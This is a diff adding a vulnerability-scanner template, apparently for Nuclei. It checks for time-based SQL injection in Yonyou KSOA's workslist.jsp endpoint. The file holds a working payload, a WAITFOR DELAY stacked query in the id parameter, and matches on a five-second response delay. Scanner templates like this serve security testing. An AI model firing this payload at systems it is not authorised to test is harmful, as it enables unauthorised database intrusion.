@@ -1,0 +1,32 @@
+id: yonyou-ksoa-workslist-sqli
+info:
+  name: 用友时空KSOA workslist.jsp SQL注入
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/crushforyou/2025hvv-poc/blob/b1cfb1bc795f9baf88cc1b882b705ecf3666c698/%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8B%E6%97%B6%E7%A9%BAKSOA%20workslist.jsp%20SQL%E6%B3%A8%E5%85%A5.txt
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    sqlmap:
+    version:
+  tags: sqli,yonyou,ksoa
+
+http:
+  - raw:  
+      - |
+        @timeout: 15s
+        GET /worksheet/workslist.jsp?id=1';WAITFOR+DELAY+'0:0:5 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - duration >= 5 && duration < 9
+        condition: and
